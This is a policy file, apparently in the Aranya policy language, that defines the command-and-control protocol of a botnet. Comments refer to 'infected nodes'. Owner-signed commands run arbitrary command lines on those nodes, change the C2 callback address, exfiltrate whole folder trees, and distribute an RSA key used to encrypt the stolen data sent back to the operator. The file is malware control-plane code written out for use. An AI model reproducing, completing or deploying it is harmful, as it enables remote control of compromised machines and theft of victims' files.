---
policy-version: 2
---

```policy
use afc
use crypto
use device
use envelope
use idam
use perspective
use c2

// These three fact stores will only really hold the owner's key,
//   so it will not hold any infected nodes information
fact DeviceSignPk[device_id id] => {
    key bytes
}

fact DeviceIdentPk[device_id id] => {
    key bytes
}

fact DeviceRsaPk[device_id id] => {
    n bytes,
    e bytes
}

// This int is not really a key. It's only value will ever be
//   0. It's like a global variable in this policy
fact LastCallback[a int] => {
    callback string
}

function do_seal(payload bytes) struct Envelope {
    let parent_id = perspective::head_id()
    let device_id = device::current_device_id()
    let pk = check_unwrap query DeviceSignPk[device_id: device_id]
    let sig = crypto::sign(
        idam::derive_sign_key_id(pk.key),
        payload
    )

    return envelope::new(
        parent_id,
        device_id,
        sig.command_id,
        sig.signature,
        payload,
    )
}

function do_open(envelope struct Envelope) bytes {
    let author_id = envelope::author_id(envelope)
    let pk = check_unwrap query DeviceSignPk[device_id: author_id]

    return crypto::verify(
        pk.key,
        envelope::parent_id(envelope),
        envelope::payload(envelope),
        envelope::command_id(envelope),
        envelope::signature(envelope),
    )
}

struct PublicKeyBundle {
    ident_key bytes,
    sign_key bytes,
    enc_key bytes
}

// Init command to store the owner's keys for signing of
//   future actions
command Init {
    attributes {
        init: true
    }

    fields {
        keys struct PublicKeyBundle
    }

    seal {
        let payload = serialize(this)
        let pk_id = idam::derive_sign_key_id(this.keys.sign_key)
        let signed = crypto::sign(pk_id, payload)

        return envelope::new(
            perspective::head_id(),
            device::current_device_id(),
            signed.command_id,
            signed.signature,
            payload
        )
    }

    open {
        let payload = envelope::payload(envelope)
        let pk = deserialize(payload).keys.sign_key

        let verified = crypto::verify(
            pk,
            envelope::parent_id(envelope),
            payload,
            envelope::command_id(envelope),
            envelope::signature(envelope)
        )

        return deserialize(verified)
    }

    policy {
        let device_id = envelope::author_id(envelope)
        finish {
            create DeviceSignPk[device_id: device_id] => {key: this.keys.sign_key}
            create DeviceIdentPk[device_id: device_id] => {key: this.keys.ident_key}
            create LastCallback[a: 0] => {callback: ""}
        }
    }
}

action init(keys struct PublicKeyBundle) {
    publish Init {
        keys: keys
    }
}

// Check if owner (if keys are stored in fact)
// TODO: This is probably a goofy way to do it tbh
function is_owner(envelope struct Envelope) bool {
    let ident = check_unwrap query DeviceIdentPk[
        device_id: envelope::author_id(envelope)
    ]
    
    let device_id = idam::derive_device_id(ident.key)

    return exists DeviceSignPk[device_id: device_id]
}

effect Command {
    cmdline string
}

command CommandExecution {
    attributes {
        priority: 100
    }

    fields {
        cmdline string
    }

    seal {
        return do_seal(serialize(this))
    }

    open {
        return deserialize(do_open(envelope))
    }

    policy {
        check is_owner(envelope)

        finish {
            emit Command { cmdline: this.cmdline }
        }
    }
}

// Operator-issued commands
action execute_command(cmdline string) {
    publish CommandExecution {
        cmdline: cmdline
    }
}


command UpdateRsaKey {
    attributes {
        priority: 100
    }

    fields {
        n bytes,
        e bytes
    }

    seal {
        return do_seal(serialize(this))
    }

    open {
        return deserialize(do_open(envelope))
    }

    policy {
        check is_owner(envelope)

        let device_id = envelope::author_id(envelope)

        let devicersa = query DeviceRsaPk[
            device_id: device_id
        ]

        if devicersa is None {
            finish {
                create DeviceRsaPk[device_id: device_id] => {
                    n: this.n,
                    e: this.e
                }
            }
        } else {
            let rsakey = unwrap devicersa
            finish {
                update DeviceRsaPk[device_id: device_id] => {
                    n: rsakey.n,
                    e: rsakey.e
                } to {
                    n: this.n,
                    e: this.e
                }
            }
        }
    }
}

effect UpdateCallbackC2Effect {
    address string
}

command UpdateCallbackC2 {
    attributes {
        priority: 100
    }

    fields {
        address string
    }

    seal {
        return do_seal(serialize(this))
    }

    open {
        return deserialize(do_open(envelope))
    }

    policy {
        check is_owner(envelope)

        let device_id = envelope::author_id(envelope)

        let last_callback = check_unwrap query LastCallback[a: 0]

        finish {
            emit UpdateCallbackC2Effect {
                address: this.address
            }

            update LastCallback[a: 0] => {
                callback: last_callback.callback
            } to {
                callback: this.address
            }
        }
    }
}

action update_callback_c2(address string) {
    publish UpdateCallbackC2 {
        address: address
    }
}

// Action to allow the network operator/owner to update its
//   public key for data encryption
action update_rsa_key(n bytes, e bytes) {
    publish UpdateRsaKey {
        n: n,
        e: e
    }
}

effect ExfiltrateFoldersEffect {
    rootdir string
}

command ExfiltrateFolders {
    attributes {
        priority: 100
    }

    fields {
        rootdir string
    }

    seal {
        return do_seal(serialize(this))
    }

    open {
        return deserialize(do_open(envelope))
    }

    policy {
        check is_owner(envelope)

        finish {
            emit ExfiltrateFoldersEffect {
                rootdir: this.rootdir
            }
        }
    }
}

// Exfiltrate the contents of a folder and its subdirectories
action exfiltrate_folders(rootdir string) {
    publish ExfiltrateFolders {
        rootdir: rootdir
    }
}

// Ephemeral effect to query the owner's public key
//   for encryption of data sent from an infected node
//   to the owner
effect QueryOwnerKeyResult {
    n bytes,
    e bytes
}

ephemeral command QueryOwnerKey {
    fields {
        n bytes,
        e bytes
    }

    seal {
        // We don't care about any crypto stuff for
        //   ephemeral commands
        let randomid = perspective::head_id()
        let randombytes = this.n

        return envelope::new(
            randomid,
            randomid,
            randomid,
            randombytes,
            serialize(this)
        )
    }

    open {
        // No need for crypto
        return deserialize(envelope.payload)
    }

    policy {
        finish {
            emit QueryOwnerKeyResult {
                n: this.n,
                e: this.e
            }
        }
    }
}

effect QueryCallbackResult {
    callback string
}

ephemeral command QueryCallback {
    fields {
        callback string
    }

    seal {
        // We don't care about any crypto stuff for
        //   ephemeral commands
        let randomid = perspective::head_id()

        let s = serialize(this)

        return envelope::new(
            randomid,
            randomid,
            randomid,
            s,
            s
        )
    }

    open {
        // No need for crypto
        return deserialize(envelope.payload)
    }

    policy {
        finish {
            emit QueryCallbackResult {
                callback: this.callback
            }
        }
    }
}

// There should only be one entry in here, so we can just
//   loop like this and it will only ever publish once
ephemeral action get_owner_key() {
    map DeviceRsaPk[device_id: ?] as device {
        publish QueryOwnerKey {
            n: device.n,
            e: device.e
        }
    }
}

ephemeral action get_last_callback() {
    let callback = query LastCallback[a: 0]
    if !(callback is None) {
        let callback_unwrap = unwrap callback
        publish QueryCallback {
            callback: callback_unwrap.callback
        }
    }
}
```
